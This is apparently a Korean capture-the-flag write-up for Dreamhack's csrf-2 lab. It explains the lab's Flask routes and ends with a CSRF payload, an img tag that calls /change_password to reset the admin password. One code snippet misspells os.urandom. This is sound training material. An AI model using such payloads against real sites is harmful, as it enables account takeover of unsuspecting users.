# [Dreamhack] csrf-2 풀이

## 루트 페이지
``` python
@app.route("/")
def index():
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html', text='please login')

    return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not an admin"}')
```
## /vuln
```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "").lower()
    xss_filter = ["frame", "script", "on"]
    for _ in xss_filter:
        param = param.replace(_, "*")
    return param
```
csrf-1 과 동일한 구성

## /flag
```python
@app.route("/flag", methods=["GET", "POST"])
# flag 페이지 라우팅 (GET, POST 요청을 모두 받음)
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param", "")
        session_id = os.urandom(16).hex()
       

        session_storage[session_id] = 'admin'

        if not check_csrf(param, {"name":"sessionid", "value": session_id}):
            return '<script>alert("wrong??");history.go(-1);</script>'
        return '<script>alert("good");history.go(-1);</script>'
```
```python3
session_id = os.uandom(16).hex()
```
무작위 세션 ID 생성 후 16진수 문자열로 변환

```python3
session_storage[session_id] = 'admin'
```
세션 ID를 key로 사용하여 admin 값을 session_storage dictionary에 저장

```python3
if not check_csrf(param, {"name":"sessionid", "value": session_id}):
```
이 admin 세션 쿠키를 들고 공격자가 제출한 param(payload) URL에 접속

## /login
```python3
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')

    elif request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        try:
            pw = users[username]
        except:
            return '<script>alert("not found user");history.go(-1);</script>'
        
        if pw == password:
            resp = make_response(redirect(url_for('index')))
            session_id = os.urandom(8).hex()
            session_storage[session_id] = username
            resp.set_cookie('sessionid', session_id)
            return resp

        return '<script>alert("wrong password");history.go(-1);</script>'
```
사용자에게 username과 pw를 입력 받아서 pw = password 일때, session_id 라는 쿠키를 생성
session_storage의 username의 쿠키 저장
resp.set_cookie 생성된 쿠키를 사용자(user)에게 전달

## /change_password
```python
@app.route("/change_password")
def change_password():
    pw = request.args.get("pw", "")
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html', text='please login')

    users[username] = pw
    return 'Done'
```
pw를 입력 받아서 pw에 저장 하고 session_id 에 쿠키를 통해 세션 아이디를 받아옴(GET으로) -> 세션에 연결된 사용자의 비밀번호를 pw로 변경함

## 페이로드
```python
<img src="/change_password?pw=admin">
```
admin의 쿠키로 요청(GET)해서 비밀번호를 초기화 함.
